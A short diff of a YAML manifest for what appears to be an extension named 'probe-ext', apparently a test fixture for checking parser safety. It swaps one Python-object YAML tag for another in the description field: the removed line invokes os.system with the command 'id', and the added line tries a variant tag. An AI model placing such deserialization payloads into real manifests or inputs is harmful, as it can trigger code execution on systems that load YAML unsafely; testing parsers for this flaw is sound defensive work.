@@ -2,7 +2,7 @@ name: probe-ext
 version: 0.1.0
 specVersion: v1beta
 displayName: x
-description: !!python/object/apply:os.system ['id']
+description: !!python/object:os.system {}
 license: Apache-2.0
 author:
   authorName: p
